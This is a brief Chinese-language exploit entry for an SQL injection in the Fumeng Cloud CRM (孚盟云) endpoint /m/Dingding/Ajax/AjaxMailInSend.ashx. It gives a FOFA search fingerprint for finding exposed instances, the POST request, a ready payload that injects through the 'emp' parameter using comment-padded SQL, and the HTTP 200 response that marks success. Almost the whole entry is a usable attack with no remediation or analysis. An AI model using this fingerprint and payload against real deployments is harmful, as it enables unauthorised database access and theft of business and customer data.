# 孚盟云CRMAjaxMailInSend.ashx存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`POST /m/Dingding/Ajax/AjaxMailInSend.ashx HTTP/1.1`

**Payload**
```
action=autoMailTranRuler&emp=1)/**/and/**/(user=1&fid=&mid=&auotTrans=false&transFlag=false&noticeFlag=false&memo=
```
- **响应特征**：200